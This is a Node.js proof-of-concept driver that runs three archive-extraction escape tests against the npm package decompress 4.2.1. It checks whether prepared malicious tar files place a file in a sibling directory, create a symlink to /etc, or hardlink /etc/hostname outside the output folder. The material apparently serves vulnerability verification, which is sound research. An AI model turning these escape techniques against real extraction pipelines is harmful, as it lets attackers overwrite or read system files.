/*
 * decompress PoC driver — runs DC-01..03 against decompress@4.2.1.
 */
const fs   = require("fs");
const path = require("path");
const cp   = require("child_process");
const decompress = require("decompress");

const ARCHIVES = {
  DC01: "/tmp/dc01-evil-archive.tar",
  DC02: "/tmp/dc02-symlink-archive.tar",
  DC03: "/tmp/dc03-hardlink-archive.tar",
};

async function clean() {
  for (const d of ["/tmp/dc01-out", "/tmp/dc01-out-evil"]) {
    cp.execSync(`rm -rf ${d}`);
  }
  cp.execSync(`rm -f /tmp/dc02_sibling /tmp/dc03_hostname`);
}

async function runOne(name, archive, outDir) {
  cp.execSync(`mkdir -p ${outDir}`);
  console.log(`\n=== ${name}: extracting ${archive} into ${outDir} ===`);
  let extracted;
  try {
    extracted = await decompress(archive, outDir);
    console.log(`  decompress OK: ${extracted.length} files`);
    for (const f of extracted) console.log(`    - type=${f.type} path=${f.path} linkname=${f.linkname||"-"}`);
  } catch (e) {
    console.log(`  decompress threw: ${e.message}`);
  }
  // Check for the prefix-bypass escape: file lands in a SIBLING dir
  if (name === "DC01") {
    const sibDir  = "/tmp/dc01-out-evil";
    const sibFile = path.join(sibDir, "pwn.txt");
    if (fs.existsSync(sibFile)) {
      const contents = fs.readFileSync(sibFile, "utf8").trim();
      const intendedFile = path.join(outDir, "pwn.txt");
      const landedInIntended = fs.existsSync(intendedFile);
      console.log(`  >>> DC-01 CONFIRMED: file at ${sibFile} (NOT in ${outDir})`);
      console.log(`  >>> contents: ${contents}`);
      console.log(`  >>> intended output had file? ${landedInIntended}`);
      return true;
    }
  }
  if (name === "DC02") {
    const linkPath = path.join(outDir, "dc02_link");
    if (fs.existsSync(linkPath)) {
      const lst = fs.lstatSync(linkPath);
      if (lst.isSymbolicLink()) {
        const tgt = fs.readlinkSync(linkPath);
        console.log(`  >>> DC-02 CONFIRMED: symlink at ${linkPath} -> ${tgt} (out of output dir)`);
        // A subsequent write through this symlink (e.g. another archive entry
        // or a manual cp) would land at /etc, not in the output dir.
        return true;
      }
    }
  }
  if (name === "DC03") {
    const hlPath = path.join(outDir, "dc03_hostname");
    if (fs.existsSync(hlPath)) {
      const lst = fs.lstatSync(hlPath);
      const got = fs.readFileSync(hlPath, "utf8").trim();
      const real = fs.readFileSync("/etc/hostname", "utf8").trim();
      if (lst.nlink > 1 && got === real) {
        console.log(`  >>> DC-03 CONFIRMED: hardlink at ${hlPath} resolves to /etc/hostname`);
        console.log(`  >>> nlink=${lst.nlink} (inodes shared across dirs)`);
        console.log(`  >>> contents: ${got}`);
        return true;
      }
    }
  }
  return false;
}

(async () => {
  console.log("decompress PoC — version:", require("decompress/package.json").version);
  await clean();
  let escaped = 0;
  escaped += await runOne("DC01", ARCHIVES.DC01, "/tmp/dc01-out") ? 1 : 0;
  escaped += await runOne("DC02", ARCHIVES.DC02, "/tmp/dc02-out") ? 1 : 0;
  escaped += await runOne("DC03", ARCHIVES.DC03, "/tmp/dc03-out") ? 1 : 0;
  console.log(`\n=== RESULT: ${escaped}/3 escapes confirmed ===`);
  process.exit(escaped > 0 ? 0 : 1);
})();
